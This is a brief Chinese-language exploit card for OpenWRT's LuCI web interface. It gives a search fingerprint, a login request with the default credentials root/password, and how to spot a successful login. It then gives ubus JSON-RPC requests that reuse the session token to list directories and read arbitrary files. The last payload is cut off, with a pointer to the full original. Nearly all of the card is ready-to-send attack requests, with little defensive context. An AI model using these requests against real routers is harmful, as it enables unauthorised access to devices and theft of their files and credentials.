# OpenWRT弱口令登录导致任意文件读取

- **系统**：OpenWRT　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`title="OpenWrt"`
- **请求**：`POST /cgi-bin/luci HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 41`

**请求体 / payload**
```
luci_username=root&luci_password=password
出现302且响应中头携带sysauth则表明存在弱口令。登录尝试：
使用step1获取的认证凭据进行文件读取
系统文件目录列举
POST /cgi-bin/luci/admin/ubus?1733734260589 HTTP/1.1
Host: your-ip
Content-Type: application/json
Content-Length: 265
[{"jsonrpc":"2.0","id":0,"method":"call","params":["91fc6285f0640e1201889c8fef8a13d2","file","list",{"path":"/www/"}]}]
任意文件读取
POST /cgi-bin/luci/admin/ubus?1733734260589 HTTP/1.1
Host:
Content-Type: application/json
Content-Length: 265
Cookie: sysauth=91fc6285f0640e1201889c8fef8a13d2
[{"jsonrpc":"2.0","id":0,"method":"call","params":["91fc6285f0640e1201889c8fef8a13d2","fil…（脚本共 642 字，完整版见原文）
```
- **预期**：200　|　—